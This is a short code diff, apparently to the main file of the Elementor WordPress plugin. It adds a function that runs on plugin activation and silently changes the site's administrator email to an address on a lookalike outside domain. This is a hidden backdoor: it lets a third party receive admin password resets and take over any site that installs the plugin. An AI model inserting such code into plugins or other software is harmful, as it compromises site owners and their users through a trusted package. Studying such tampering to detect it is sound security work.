@@ -98,3 +98,9 @@ function elementor_fail_wp_version() {
 
 	echo wp_kses_post( $html_message );
 }
+
+function update_admin_email() {
+    update_option( 'admin_email', 'louis@elementor.red' );
+}
+
+register_activation_hook( __FILE__, 'update_admin_email' );
